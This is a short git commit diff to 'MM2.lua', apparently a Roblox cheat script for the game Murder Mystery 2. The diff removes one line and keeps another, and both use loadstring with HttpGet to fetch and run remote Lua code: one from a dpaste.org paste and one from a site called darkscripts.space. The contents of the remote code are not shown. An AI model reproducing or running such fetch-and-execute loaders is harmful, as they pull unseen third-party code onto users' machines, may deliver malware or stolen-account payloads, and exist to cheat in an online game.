31b64284aaa79cce364ba95ecc85c2bab24f00bb
mm2 <forfreeporno733@gmail.com>
2024-12-15 10:26:14 -0300

    Update MM2.lua

--- MM2.lua
+++ MM2.lua
@@ -1,3 +1,2 @@
-loadstring(game:HttpGet('https://dpaste.org/eEWZh/raw',true))()
 
 loadstring(game:HttpGet('https://darkscripts.space/scripts/60e89d50-7417-4a09-a3ee-f7f50d94f871_773355502243020850.lua',true))()
